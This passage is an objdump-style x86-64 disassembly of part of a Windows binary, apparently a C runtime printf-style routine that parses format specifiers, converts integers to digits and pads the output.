   14000500d:	48 89 85 d8 01 00 00 	mov    %rax,0x1d8(%rbp)
   140005014:	33 c0                	xor    %eax,%eax
   140005016:	48 8b f1             	mov    %rcx,%rsi
   140005019:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   14000501e:	48 8b fa             	mov    %rdx,%rdi
   140005021:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140005025:	49 8b d0             	mov    %r8,%rdx
   140005028:	4d 8b e9             	mov    %r9,%r13
   14000502b:	89 44 24 70          	mov    %eax,0x70(%rsp)
   14000502f:	44 8b f0             	mov    %eax,%r14d
   140005032:	89 44 24 54          	mov    %eax,0x54(%rsp)
   140005036:	44 8b e0             	mov    %eax,%r12d
   140005039:	89 44 24 48          	mov    %eax,0x48(%rsp)
   14000503d:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140005041:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140005045:	8b d8                	mov    %eax,%ebx
   140005047:	89 44 24 50          	mov    %eax,0x50(%rsp)
   14000504b:	e8 ec fe ff ff       	call   0x140004f3c
   140005050:	e8 23 f5 ff ff       	call   0x140004578
   140005055:	41 83 c8 ff          	or     $0xffffffff,%r8d
   140005059:	45 33 d2             	xor    %r10d,%r10d
   14000505c:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140005060:	48 85 f6             	test   %rsi,%rsi
   140005063:	0f 84 36 09 00 00    	je     0x14000599f
   140005069:	f6 46 18 40          	testb  $0x40,0x18(%rsi)
   14000506d:	4c 8d 0d 8c af ff ff 	lea    -0x5074(%rip),%r9        # 0x140000000
   140005074:	0f 85 86 00 00 00    	jne    0x140005100
   14000507a:	48 8b ce             	mov    %rsi,%rcx
   14000507d:	e8 02 f1 ff ff       	call   0x140004184
   140005082:	4c 8d 05 d7 44 01 00 	lea    0x144d7(%rip),%r8        # 0x140019560
   140005089:	4c 63 d0             	movslq %eax,%r10
   14000508c:	41 8d 4a 02          	lea    0x2(%r10),%ecx
   140005090:	83 f9 01             	cmp    $0x1,%ecx
   140005093:	76 22                	jbe    0x1400050b7
   140005095:	49 8b d2             	mov    %r10,%rdx
   140005098:	49 8b ca             	mov    %r10,%rcx
   14000509b:	48 8d 05 5e af ff ff 	lea    -0x50a2(%rip),%rax        # 0x140000000
   1400050a2:	83 e2 1f             	and    $0x1f,%edx
   1400050a5:	48 c1 f9 05          	sar    $0x5,%rcx
   1400050a9:	4c 6b ca 58          	imul   $0x58,%rdx,%r9
   1400050ad:	4c 03 8c c8 10 af 01 	add    0x1af10(%rax,%rcx,8),%r9
   1400050b4:	00 
   1400050b5:	eb 03                	jmp    0x1400050ba
   1400050b7:	4d 8b c8             	mov    %r8,%r9
   1400050ba:	41 f6 41 38 7f       	testb  $0x7f,0x38(%r9)
   1400050bf:	0f 85 da 08 00 00    	jne    0x14000599f
   1400050c5:	41 8d 42 02          	lea    0x2(%r10),%eax
   1400050c9:	4c 8d 0d 30 af ff ff 	lea    -0x50d0(%rip),%r9        # 0x140000000
   1400050d0:	83 f8 01             	cmp    $0x1,%eax
   1400050d3:	76 19                	jbe    0x1400050ee
   1400050d5:	49 8b ca             	mov    %r10,%rcx
   1400050d8:	49 8b c2             	mov    %r10,%rax
   1400050db:	83 e1 1f             	and    $0x1f,%ecx
   1400050de:	48 c1 f8 05          	sar    $0x5,%rax
   1400050e2:	4c 6b c1 58          	imul   $0x58,%rcx,%r8
   1400050e6:	4d 03 84 c1 10 af 01 	add    0x1af10(%r9,%rax,8),%r8
   1400050ed:	00 
   1400050ee:	41 f6 40 38 80       	testb  $0x80,0x38(%r8)
   1400050f3:	0f 85 a6 08 00 00    	jne    0x14000599f
   1400050f9:	41 83 c8 ff          	or     $0xffffffff,%r8d
   1400050fd:	45 33 d2             	xor    %r10d,%r10d
   140005100:	48 85 ff             	test   %rdi,%rdi
   140005103:	0f 84 96 08 00 00    	je     0x14000599f
   140005109:	44 8a 3f             	mov    (%rdi),%r15b
   14000510c:	41 8b f2             	mov    %r10d,%esi
   14000510f:	44 89 54 24 40       	mov    %r10d,0x40(%rsp)
   140005114:	44 89 54 24 44       	mov    %r10d,0x44(%rsp)
   140005119:	41 8b d2             	mov    %r10d,%edx
   14000511c:	4c 89 55 88          	mov    %r10,-0x78(%rbp)
   140005120:	45 84 ff             	test   %r15b,%r15b
   140005123:	0f 84 8e 08 00 00    	je     0x1400059b7
   140005129:	41 bb 00 02 00 00    	mov    $0x200,%r11d
   14000512f:	48 ff c7             	inc    %rdi
   140005132:	48 89 7d 98          	mov    %rdi,-0x68(%rbp)
   140005136:	85 f6                	test   %esi,%esi
   140005138:	0f 88 79 08 00 00    	js     0x1400059b7
   14000513e:	41 8d 47 e0          	lea    -0x20(%r15),%eax
   140005142:	3c 58                	cmp    $0x58,%al
   140005144:	77 12                	ja     0x140005158
   140005146:	49 0f be c7          	movsbq %r15b,%rax
   14000514a:	42 0f be 8c 08 90 19 	movsbl 0x11990(%rax,%r9,1),%ecx
   140005151:	01 00 
   140005153:	83 e1 0f             	and    $0xf,%ecx
   140005156:	eb 03                	jmp    0x14000515b
   140005158:	41 8b ca             	mov    %r10d,%ecx
   14000515b:	48 63 c2             	movslq %edx,%rax
   14000515e:	48 63 c9             	movslq %ecx,%rcx
   140005161:	48 8d 14 c8          	lea    (%rax,%rcx,8),%rdx
   140005165:	42 0f be 94 0a b0 19 	movsbl 0x119b0(%rdx,%r9,1),%edx
   14000516c:	01 00 
   14000516e:	c1 fa 04             	sar    $0x4,%edx
   140005171:	89 54 24 5c          	mov    %edx,0x5c(%rsp)
   140005175:	8b ca                	mov    %edx,%ecx
   140005177:	85 d2                	test   %edx,%edx
   140005179:	0f 84 e2 06 00 00    	je     0x140005861
   14000517f:	ff c9                	dec    %ecx
   140005181:	0f 84 f4 07 00 00    	je     0x14000597b
   140005187:	ff c9                	dec    %ecx
   140005189:	0f 84 9c 07 00 00    	je     0x14000592b
   14000518f:	ff c9                	dec    %ecx
   140005191:	0f 84 58 07 00 00    	je     0x1400058ef
   140005197:	ff c9                	dec    %ecx
   140005199:	0f 84 48 07 00 00    	je     0x1400058e7
   14000519f:	ff c9                	dec    %ecx
   1400051a1:	0f 84 0b 07 00 00    	je     0x1400058b2
   1400051a7:	ff c9                	dec    %ecx
   1400051a9:	0f 84 28 06 00 00    	je     0x1400057d7
   1400051af:	ff c9                	dec    %ecx
   1400051b1:	0f 85 0b 06 00 00    	jne    0x1400057c2
   1400051b7:	41 0f be cf          	movsbl %r15b,%ecx
   1400051bb:	83 f9 64             	cmp    $0x64,%ecx
   1400051be:	0f 8f 69 01 00 00    	jg     0x14000532d
   1400051c4:	0f 84 5b 02 00 00    	je     0x140005425
   1400051ca:	83 f9 41             	cmp    $0x41,%ecx
   1400051cd:	0f 84 2f 01 00 00    	je     0x140005302
   1400051d3:	83 f9 43             	cmp    $0x43,%ecx
   1400051d6:	0f 84 cc 00 00 00    	je     0x1400052a8
   1400051dc:	8d 41 bb             	lea    -0x45(%rcx),%eax
   1400051df:	a9 fd ff ff ff       	test   $0xfffffffd,%eax
   1400051e4:	0f 84 18 01 00 00    	je     0x140005302
   1400051ea:	83 f9 53             	cmp    $0x53,%ecx
   1400051ed:	74 6d                	je     0x14000525c
   1400051ef:	83 f9 58             	cmp    $0x58,%ecx
   1400051f2:	0f 84 c6 01 00 00    	je     0x1400053be
   1400051f8:	83 f9 5a             	cmp    $0x5a,%ecx
   1400051fb:	74 17                	je     0x140005214
   1400051fd:	83 f9 61             	cmp    $0x61,%ecx
   140005200:	0f 84 08 01 00 00    	je     0x14000530e
   140005206:	83 f9 63             	cmp    $0x63,%ecx
   140005209:	0f 84 a7 00 00 00    	je     0x1400052b6
   14000520f:	e9 1c 04 00 00       	jmp    0x140005630
   140005214:	49 8b 45 00          	mov    0x0(%r13),%rax
   140005218:	49 83 c5 08          	add    $0x8,%r13
   14000521c:	48 85 c0             	test   %rax,%rax
   14000521f:	74 2f                	je     0x140005250
   140005221:	48 8b 58 08          	mov    0x8(%rax),%rbx
   140005225:	48 85 db             	test   %rbx,%rbx
   140005228:	74 26                	je     0x140005250
   14000522a:	0f bf 00             	movswl (%rax),%eax
   14000522d:	41 0f ba e6 0b       	bt     $0xb,%r14d
   140005232:	73 12                	jae    0x140005246
   140005234:	99                   	cltd
   140005235:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   14000523c:	00 
   14000523d:	2b c2                	sub    %edx,%eax
   14000523f:	d1 f8                	sar    $1,%eax
   140005241:	e9 e6 03 00 00       	jmp    0x14000562c
   140005246:	44 89 54 24 50       	mov    %r10d,0x50(%rsp)
   14000524b:	e9 dc 03 00 00       	jmp    0x14000562c
   140005250:	48 8b 1d f9 42 01 00 	mov    0x142f9(%rip),%rbx        # 0x140019550
   140005257:	e9 c5 03 00 00       	jmp    0x140005621
   14000525c:	41 f7 c6 30 08 00 00 	test   $0x830,%r14d
   140005263:	75 05                	jne    0x14000526a
   140005265:	41 0f ba ee 0b       	bts    $0xb,%r14d
   14000526a:	49 8b 5d 00          	mov    0x0(%r13),%rbx
   14000526e:	45 3b e0             	cmp    %r8d,%r12d
   140005271:	41 8b c4             	mov    %r12d,%eax
   140005274:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
   140005279:	0f 44 c1             	cmove  %ecx,%eax
   14000527c:	49 83 c5 08          	add    $0x8,%r13
   140005280:	41 f7 c6 10 08 00 00 	test   $0x810,%r14d
   140005287:	0f 84 fd 00 00 00    	je     0x14000538a
   14000528d:	48 85 db             	test   %rbx,%rbx
   140005290:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140005297:	00 
   140005298:	48 0f 44 1d b8 42 01 	cmove  0x142b8(%rip),%rbx        # 0x140019558
   14000529f:	00 
   1400052a0:	48 8b cb             	mov    %rbx,%rcx
   1400052a3:	e9 d6 00 00 00       	jmp    0x14000537e
   1400052a8:	41 f7 c6 30 08 00 00 	test   $0x830,%r14d
   1400052af:	75 05                	jne    0x1400052b6
   1400052b1:	41 0f ba ee 0b       	bts    $0xb,%r14d
   1400052b6:	49 83 c5 08          	add    $0x8,%r13
   1400052ba:	41 f7 c6 10 08 00 00 	test   $0x810,%r14d
   1400052c1:	74 27                	je     0x1400052ea
   1400052c3:	45 0f b7 4d f8       	movzwl -0x8(%r13),%r9d
   1400052c8:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   1400052cc:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   1400052d1:	4d 8b c3             	mov    %r11,%r8
   1400052d4:	e8 2f 49 00 00       	call   0x140009c08
   1400052d9:	45 33 d2             	xor    %r10d,%r10d
   1400052dc:	85 c0                	test   %eax,%eax
   1400052de:	74 19                	je     0x1400052f9
   1400052e0:	c7 44 24 58 01 00 00 	movl   $0x1,0x58(%rsp)
   1400052e7:	00 
   1400052e8:	eb 0f                	jmp    0x1400052f9
   1400052ea:	41 8a 45 f8          	mov    -0x8(%r13),%al
   1400052ee:	c7 44 24 44 01 00 00 	movl   $0x1,0x44(%rsp)
   1400052f5:	00 
   1400052f6:	88 45 d0             	mov    %al,-0x30(%rbp)
   1400052f9:	48 8d 5d d0          	lea    -0x30(%rbp),%rbx
   1400052fd:	e9 2e 03 00 00       	jmp    0x140005630
   140005302:	c7 44 24 60 01 00 00 	movl   $0x1,0x60(%rsp)
   140005309:	00 
   14000530a:	41 80 c7 20          	add    $0x20,%r15b
   14000530e:	41 83 ce 40          	or     $0x40,%r14d
   140005312:	48 8d 5d d0          	lea    -0x30(%rbp),%rbx
   140005316:	41 8b f3             	mov    %r11d,%esi
   140005319:	45 85 e4             	test   %r12d,%r12d
   14000531c:	0f 89 21 02 00 00    	jns    0x140005543
   140005322:	41 bc 06 00 00 00    	mov    $0x6,%r12d
   140005328:	e9 5c 02 00 00       	jmp    0x140005589
   14000532d:	83 f9 67             	cmp    $0x67,%ecx
   140005330:	7e dc                	jle    0x14000530e
   140005332:	83 f9 69             	cmp    $0x69,%ecx
   140005335:	0f 84 ea 00 00 00    	je     0x140005425
   14000533b:	83 f9 6e             	cmp    $0x6e,%ecx
   14000533e:	0f 84 af 00 00 00    	je     0x1400053f3
   140005344:	83 f9 6f             	cmp    $0x6f,%ecx
   140005347:	0f 84 96 00 00 00    	je     0x1400053e3
   14000534d:	83 f9 70             	cmp    $0x70,%ecx
   140005350:	74 61                	je     0x1400053b3
   140005352:	83 f9 73             	cmp    $0x73,%ecx
   140005355:	0f 84 0f ff ff ff    	je     0x14000526a
   14000535b:	83 f9 75             	cmp    $0x75,%ecx
   14000535e:	0f 84 c5 00 00 00    	je     0x140005429
   140005364:	83 f9 78             	cmp    $0x78,%ecx
   140005367:	0f 85 c3 02 00 00    	jne    0x140005630
   14000536d:	8d 41 af             	lea    -0x51(%rcx),%eax
   140005370:	eb 51                	jmp    0x1400053c3
   140005372:	ff c8                	dec    %eax
   140005374:	66 44 39 11          	cmp    %r10w,(%rcx)
   140005378:	74 08                	je     0x140005382
   14000537a:	48 83 c1 02          	add    $0x2,%rcx
   14000537e:	85 c0                	test   %eax,%eax
   140005380:	75 f0                	jne    0x140005372
   140005382:	48 2b cb             	sub    %rbx,%rcx
   140005385:	48 d1 f9             	sar    $1,%rcx
   140005388:	eb 20                	jmp    0x1400053aa
   14000538a:	48 85 db             	test   %rbx,%rbx
   14000538d:	48 0f 44 1d bb 41 01 	cmove  0x141bb(%rip),%rbx        # 0x140019550
   140005394:	00 
   140005395:	48 8b cb             	mov    %rbx,%rcx
   140005398:	eb 0a                	jmp    0x1400053a4
   14000539a:	ff c8                	dec    %eax
   14000539c:	44 38 11             	cmp    %r10b,(%rcx)
   14000539f:	74 07                	je     0x1400053a8
   1400053a1:	48 ff c1             	inc    %rcx
   1400053a4:	85 c0                	test   %eax,%eax
   1400053a6:	75 f2                	jne    0x14000539a
   1400053a8:	2b cb                	sub    %ebx,%ecx
   1400053aa:	89 4c 24 44          	mov    %ecx,0x44(%rsp)
   1400053ae:	e9 7d 02 00 00       	jmp    0x140005630
   1400053b3:	41 bc 10 00 00 00    	mov    $0x10,%r12d
   1400053b9:	41 0f ba ee 0f       	bts    $0xf,%r14d
   1400053be:	b8 07 00 00 00       	mov    $0x7,%eax
   1400053c3:	89 44 24 70          	mov    %eax,0x70(%rsp)
   1400053c7:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   1400053cd:	45 84 f6             	test   %r14b,%r14b
   1400053d0:	79 5d                	jns    0x14000542f
   1400053d2:	04 51                	add    $0x51,%al
   1400053d4:	c6 44 24 4c 30       	movb   $0x30,0x4c(%rsp)
   1400053d9:	41 8d 51 f2          	lea    -0xe(%r9),%edx
   1400053dd:	88 44 24 4d          	mov    %al,0x4d(%rsp)
   1400053e1:	eb 50                	jmp    0x140005433
   1400053e3:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1400053e9:	45 84 f6             	test   %r14b,%r14b
   1400053ec:	79 41                	jns    0x14000542f
   1400053ee:	45 0b f3             	or     %r11d,%r14d
   1400053f1:	eb 3c                	jmp    0x14000542f
   1400053f3:	49 8b 7d 00          	mov    0x0(%r13),%rdi
   1400053f7:	49 83 c5 08          	add    $0x8,%r13
   1400053fb:	e8 64 46 00 00       	call   0x140009a64
   140005400:	45 33 d2             	xor    %r10d,%r10d
   140005403:	85 c0                	test   %eax,%eax
   140005405:	0f 84 94 05 00 00    	je     0x14000599f
   14000540b:	41 f6 c6 20          	test   $0x20,%r14b
   14000540f:	74 05                	je     0x140005416
   140005411:	66 89 37             	mov    %si,(%rdi)
   140005414:	eb 02                	jmp    0x140005418
   140005416:	89 37                	mov    %esi,(%rdi)
   140005418:	c7 44 24 58 01 00 00 	movl   $0x1,0x58(%rsp)
   14000541f:	00 
   140005420:	e9 6c 03 00 00       	jmp    0x140005791
   140005425:	41 83 ce 40          	or     $0x40,%r14d
   140005429:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   14000542f:	8b 54 24 48          	mov    0x48(%rsp),%edx
   140005433:	b8 00 80 00 00       	mov    $0x8000,%eax
   140005438:	44 85 f0             	test   %r14d,%eax
   14000543b:	74 0a                	je     0x140005447
   14000543d:	4d 8b 45 00          	mov    0x0(%r13),%r8
   140005441:	49 83 c5 08          	add    $0x8,%r13
   140005445:	eb 3a                	jmp    0x140005481
   140005447:	41 0f ba e6 0c       	bt     $0xc,%r14d
   14000544c:	72 ef                	jb     0x14000543d
   14000544e:	49 83 c5 08          	add    $0x8,%r13
   140005452:	41 f6 c6 20          	test   $0x20,%r14b
   140005456:	74 19                	je     0x140005471
   140005458:	4c 89 6c 24 78       	mov    %r13,0x78(%rsp)
   14000545d:	41 f6 c6 40          	test   $0x40,%r14b
   140005461:	74 07                	je     0x14000546a
   140005463:	4d 0f bf 45 f8       	movswq -0x8(%r13),%r8
   140005468:	eb 1c                	jmp    0x140005486
   14000546a:	45 0f b7 45 f8       	movzwl -0x8(%r13),%r8d
   14000546f:	eb 15                	jmp    0x140005486
   140005471:	41 f6 c6 40          	test   $0x40,%r14b
   140005475:	74 06                	je     0x14000547d
   140005477:	4d 63 45 f8          	movslq -0x8(%r13),%r8
   14000547b:	eb 04                	jmp    0x140005481
   14000547d:	45 8b 45 f8          	mov    -0x8(%r13),%r8d
   140005481:	4c 89 6c 24 78       	mov    %r13,0x78(%rsp)
   140005486:	41 f6 c6 40          	test   $0x40,%r14b
   14000548a:	74 0d                	je     0x140005499
   14000548c:	4d 85 c0             	test   %r8,%r8
   14000548f:	79 08                	jns    0x140005499
   140005491:	49 f7 d8             	neg    %r8
   140005494:	41 0f ba ee 08       	bts    $0x8,%r14d
   140005499:	44 85 f0             	test   %r14d,%eax
   14000549c:	75 0a                	jne    0x1400054a8
   14000549e:	41 0f ba e6 0c       	bt     $0xc,%r14d
   1400054a3:	72 03                	jb     0x1400054a8
   1400054a5:	45 8b c0             	mov    %r8d,%r8d
   1400054a8:	45 85 e4             	test   %r12d,%r12d
   1400054ab:	79 08                	jns    0x1400054b5
   1400054ad:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   1400054b3:	eb 0b                	jmp    0x1400054c0
   1400054b5:	41 83 e6 f7          	and    $0xfffffff7,%r14d
   1400054b9:	45 3b e3             	cmp    %r11d,%r12d
   1400054bc:	45 0f 4f e3          	cmovg  %r11d,%r12d
   1400054c0:	44 8b 6c 24 70       	mov    0x70(%rsp),%r13d
   1400054c5:	49 8b c0             	mov    %r8,%rax
   1400054c8:	48 8d 9d cf 01 00 00 	lea    0x1cf(%rbp),%rbx
   1400054cf:	48 f7 d8             	neg    %rax
   1400054d2:	1b c9                	sbb    %ecx,%ecx
   1400054d4:	23 ca                	and    %edx,%ecx
   1400054d6:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   1400054da:	41 8b cc             	mov    %r12d,%ecx
   1400054dd:	41 ff cc             	dec    %r12d
   1400054e0:	85 c9                	test   %ecx,%ecx
   1400054e2:	7f 05                	jg     0x1400054e9
   1400054e4:	4d 85 c0             	test   %r8,%r8
   1400054e7:	74 20                	je     0x140005509
   1400054e9:	33 d2                	xor    %edx,%edx
   1400054eb:	49 8b c0             	mov    %r8,%rax
   1400054ee:	49 63 c9             	movslq %r9d,%rcx
   1400054f1:	48 f7 f1             	div    %rcx
   1400054f4:	4c 8b c0             	mov    %rax,%r8
   1400054f7:	8d 42 30             	lea    0x30(%rdx),%eax
   1400054fa:	83 f8 39             	cmp    $0x39,%eax
   1400054fd:	7e 03                	jle    0x140005502
   1400054ff:	41 03 c5             	add    %r13d,%eax
   140005502:	88 03                	mov    %al,(%rbx)
   140005504:	48 ff cb             	dec    %rbx
   140005507:	eb d1                	jmp    0x1400054da
   140005509:	4c 8b 6c 24 78       	mov    0x78(%rsp),%r13
   14000550e:	48 8d 85 cf 01 00 00 	lea    0x1cf(%rbp),%rax
   140005515:	2b c3                	sub    %ebx,%eax
   140005517:	48 ff c3             	inc    %rbx
   14000551a:	89 44 24 44          	mov    %eax,0x44(%rsp)
   14000551e:	45 85 f3             	test   %r14d,%r11d
   140005521:	0f 84 09 01 00 00    	je     0x140005630
   140005527:	85 c0                	test   %eax,%eax
   140005529:	74 09                	je     0x140005534
   14000552b:	80 3b 30             	cmpb   $0x30,(%rbx)
   14000552e:	0f 84 fc 00 00 00    	je     0x140005630
   140005534:	48 ff cb             	dec    %rbx
   140005537:	ff 44 24 44          	incl   0x44(%rsp)
   14000553b:	c6 03 30             	movb   $0x30,(%rbx)
   14000553e:	e9 ed 00 00 00       	jmp    0x140005630
   140005543:	75 0e                	jne    0x140005553
   140005545:	41 80 ff 67          	cmp    $0x67,%r15b
   140005549:	75 3e                	jne    0x140005589
   14000554b:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   140005551:	eb 36                	jmp    0x140005589
   140005553:	45 3b e3             	cmp    %r11d,%r12d
   140005556:	45 0f 4f e3          	cmovg  %r11d,%r12d
   14000555a:	41 81 fc a3 00 00 00 	cmp    $0xa3,%r12d
   140005561:	7e 26                	jle    0x140005589
   140005563:	41 8d bc 24 5d 01 00 	lea    0x15d(%r12),%edi
   14000556a:	00 
   14000556b:	48 63 cf             	movslq %edi,%rcx
   14000556e:	e8 c1 1d 00 00       	call   0x140007334
   140005573:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   140005577:	48 85 c0             	test   %rax,%rax
   14000557a:	74 07                	je     0x140005583
   14000557c:	48 8b d8             	mov    %rax,%rbx
   14000557f:	8b f7                	mov    %edi,%esi
   140005581:	eb 06                	jmp    0x140005589
   140005583:	41 bc a3 00 00 00    	mov    $0xa3,%r12d
   140005589:	49 8b 45 00          	mov    0x0(%r13),%rax
   14000558d:	48 8b 0d 0c 4c 01 00 	mov    0x14c0c(%rip),%rcx        # 0x14001a1a0
   140005594:	49 83 c5 08          	add    $0x8,%r13
   140005598:	41 0f be ff          	movsbl %r15b,%edi
   14000559c:	48 63 f6             	movslq %esi,%rsi
   14000559f:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   1400055a3:	ff 15 df ba 00 00    	call   *0xbadf(%rip)        # 0x140011088
   1400055a9:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   1400055ad:	44 8b cf             	mov    %edi,%r9d
   1400055b0:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400055b5:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   1400055b9:	4c 8b c6             	mov    %rsi,%r8
   1400055bc:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400055c0:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400055c4:	48 8b d3             	mov    %rbx,%rdx
   1400055c7:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   1400055cc:	ff d0                	call   *%rax
   1400055ce:	41 8b fe             	mov    %r14d,%edi
   1400055d1:	81 e7 80 00 00 00    	and    $0x80,%edi
   1400055d7:	74 1b                	je     0x1400055f4
   1400055d9:	45 85 e4             	test   %r12d,%r12d
   1400055dc:	75 16                	jne    0x1400055f4
   1400055de:	48 8b 0d d3 4b 01 00 	mov    0x14bd3(%rip),%rcx        # 0x14001a1b8
   1400055e5:	ff 15 9d ba 00 00    	call   *0xba9d(%rip)        # 0x140011088
   1400055eb:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
   1400055ef:	48 8b cb             	mov    %rbx,%rcx
   1400055f2:	ff d0                	call   *%rax
   1400055f4:	41 80 ff 67          	cmp    $0x67,%r15b
   1400055f8:	75 1a                	jne    0x140005614
   1400055fa:	85 ff                	test   %edi,%edi
   1400055fc:	75 16                	jne    0x140005614
   1400055fe:	48 8b 0d ab 4b 01 00 	mov    0x14bab(%rip),%rcx        # 0x14001a1b0
   140005605:	ff 15 7d ba 00 00    	call   *0xba7d(%rip)        # 0x140011088
   14000560b:	48 8d 55 a8          	lea    -0x58(%rbp),%rdx
   14000560f:	48 8b cb             	mov    %rbx,%rcx
   140005612:	ff d0                	call   *%rax
   140005614:	80 3b 2d             	cmpb   $0x2d,(%rbx)
   140005617:	75 08                	jne    0x140005621
   140005619:	41 0f ba ee 08       	bts    $0x8,%r14d
   14000561e:	48 ff c3             	inc    %rbx
   140005621:	48 8b cb             	mov    %rbx,%rcx
   140005624:	e8 27 d5 ff ff       	call   0x140002b50
   140005629:	45 33 d2             	xor    %r10d,%r10d
   14000562c:	89 44 24 44          	mov    %eax,0x44(%rsp)
   140005630:	44 39 54 24 58       	cmp    %r10d,0x58(%rsp)
   140005635:	0f 85 56 01 00 00    	jne    0x140005791
   14000563b:	41 f6 c6 40          	test   $0x40,%r14b
   14000563f:	74 31                	je     0x140005672
   140005641:	41 0f ba e6 08       	bt     $0x8,%r14d
   140005646:	73 07                	jae    0x14000564f
   140005648:	c6 44 24 4c 2d       	movb   $0x2d,0x4c(%rsp)
   14000564d:	eb 0b                	jmp    0x14000565a
   14000564f:	41 f6 c6 01          	test   $0x1,%r14b
   140005653:	74 10                	je     0x140005665
   140005655:	c6 44 24 4c 2b       	movb   $0x2b,0x4c(%rsp)
   14000565a:	bf 01 00 00 00       	mov    $0x1,%edi
   14000565f:	89 7c 24 48          	mov    %edi,0x48(%rsp)
   140005663:	eb 11                	jmp    0x140005676
   140005665:	41 f6 c6 02          	test   $0x2,%r14b
   140005669:	74 07                	je     0x140005672
   14000566b:	c6 44 24 4c 20       	movb   $0x20,0x4c(%rsp)
   140005670:	eb e8                	jmp    0x14000565a
   140005672:	8b 7c 24 48          	mov    0x48(%rsp),%edi
   140005676:	8b 74 24 54          	mov    0x54(%rsp),%esi
   14000567a:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   14000567f:	2b 74 24 44          	sub    0x44(%rsp),%esi
   140005683:	2b f7                	sub    %edi,%esi
   140005685:	41 f6 c6 0c          	test   $0xc,%r14b
   140005689:	75 11                	jne    0x14000569c
   14000568b:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140005690:	4d 8b c7             	mov    %r15,%r8
   140005693:	8b d6                	mov    %esi,%edx
   140005695:	b1 20                	mov    $0x20,%cl
   140005697:	e8 a0 03 00 00       	call   0x140005a3c
   14000569c:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   1400056a0:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400056a5:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   1400056aa:	4d 8b c7             	mov    %r15,%r8
   1400056ad:	8b d7                	mov    %edi,%edx
   1400056af:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400056b4:	e8 d7 03 00 00       	call   0x140005a90
   1400056b9:	41 f6 c6 08          	test   $0x8,%r14b
   1400056bd:	74 17                	je     0x1400056d6
   1400056bf:	41 f6 c6 04          	test   $0x4,%r14b
   1400056c3:	75 11                	jne    0x1400056d6
   1400056c5:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400056ca:	4d 8b c7             	mov    %r15,%r8
   1400056cd:	8b d6                	mov    %esi,%edx
   1400056cf:	b1 30                	mov    $0x30,%cl
   1400056d1:	e8 66 03 00 00       	call   0x140005a3c
   1400056d6:	83 7c 24 50 00       	cmpl   $0x0,0x50(%rsp)
   1400056db:	8b 7c 24 44          	mov    0x44(%rsp),%edi
   1400056df:	74 70                	je     0x140005751
   1400056e1:	85 ff                	test   %edi,%edi
   1400056e3:	7e 6c                	jle    0x140005751
   1400056e5:	4c 8b fb             	mov    %rbx,%r15
   1400056e8:	45 0f b7 0f          	movzwl (%r15),%r9d
   1400056ec:	48 8d 95 d0 01 00 00 	lea    0x1d0(%rbp),%rdx
   1400056f3:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   1400056f7:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400056fd:	ff cf                	dec    %edi
   1400056ff:	4d 8d 7f 02          	lea    0x2(%r15),%r15
   140005703:	e8 00 45 00 00       	call   0x140009c08
   140005708:	45 33 d2             	xor    %r10d,%r10d
   14000570b:	85 c0                	test   %eax,%eax
   14000570d:	75 34                	jne    0x140005743
   14000570f:	8b 55 90             	mov    -0x70(%rbp),%edx
   140005712:	85 d2                	test   %edx,%edx
   140005714:	74 2d                	je     0x140005743
   140005716:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   14000571a:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   14000571f:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140005724:	48 8d 8d d0 01 00 00 	lea    0x1d0(%rbp),%rcx
   14000572b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005730:	e8 5b 03 00 00       	call   0x140005a90
   140005735:	45 33 d2             	xor    %r10d,%r10d
   140005738:	85 ff                	test   %edi,%edi
   14000573a:	75 ac                	jne    0x1400056e8
   14000573c:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   140005741:	eb 2c                	jmp    0x14000576f
   140005743:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   140005748:	83 c8 ff             	or     $0xffffffff,%eax
   14000574b:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000574f:	eb 22                	jmp    0x140005773
   140005751:	48 8b 45 80          	mov    -0x80(%rbp),%rax
   140005755:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000575a:	4d 8b c7             	mov    %r15,%r8
   14000575d:	8b d7                	mov    %edi,%edx
   14000575f:	48 8b cb             	mov    %rbx,%rcx
   140005762:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005767:	e8 24 03 00 00       	call   0x140005a90
   14000576c:	45 33 d2             	xor    %r10d,%r10d
   14000576f:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140005773:	85 c0                	test   %eax,%eax
   140005775:	78 1a                	js     0x140005791
   140005777:	41 f6 c6 04          	test   $0x4,%r14b
